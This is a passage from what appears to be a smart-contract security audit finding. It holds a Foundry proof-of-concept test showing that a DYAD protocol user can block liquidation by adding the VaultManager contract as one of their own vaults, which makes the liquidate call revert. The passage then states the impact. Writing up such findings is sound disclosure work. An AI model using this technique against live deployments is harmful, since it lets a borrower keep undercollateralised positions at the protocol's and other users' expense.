        vm.deal(user1, 100 ether);
        vm.deal(user2, 100 ether);

        mockKerosene.transfer(user1, 50_000_000 ether);
        // mockKerosene.transfer(user2, 10 ether);

        mockErc20.mint(user1, 100 ether);
        mockErc20.mint(user2, 100 ether);

        vm.prank(owner);
        vaultLicenser.add(address(vaultManager));
    }

function testUserCanPreventLiquidation() public {
        // Add vault manager to allow it to mint and burn dyad
        vm.prank(owner);
        vaultLicenser.add(address(vaultManager));

        vm.prank(user1);
        dnft.mintNft{value: 1 ether}(user1);

        // User adds collateral and mints Dyad
        vm.startPrank(user1);
        vaultManager.add(0, address(ethVault));
        mockErc20.approve(address(vaultManager), 15 ether);
        vaultManager.deposit(0, address(ethVault), 15 ether);

        vaultManager.mintDyad(0, 10000 * 1e18, user1);

        vm.stopPrank();

        // User 2 has the same amount of Dyad as user 1
        // It means that user 2 should be able to liquidate user 1
        vm.startPrank(user2);
        dnft.mintNft{value: 1 ether}(user2);
        vaultManager.add(1, address(ethVault));
        mockErc20.approve(address(vaultManager), 50 ether);
        vaultManager.deposit(1, address(ethVault), 50 ether);

        vaultManager.mintDyad(1, 10000 * 1e18, user2);

        vm.stopPrank();

        // Price of collateral drops
        vm.prank(owner);
        oracleMock.setPrice(500 * 1e8);

        // Users sees that price has drop and to prevent liquidation he adds vault manager to his vaults
        vm.prank(user1);
        vaultManager.add(0, address(vaultManager));

        // User 2 tries to liquidate user 1 but fails
        vm.expectRevert();
        vaultManager.liquidate(0, 1);
    }
}
```

We can see that liquidator was not able to liquidate user. `liquidate` function tries to call `getUsdValue(0)` in `VaultManagerV2` contract but this function is not implemented so it reverts.

## Impact

User can avoid liquidation keeping Dyad and collateral.

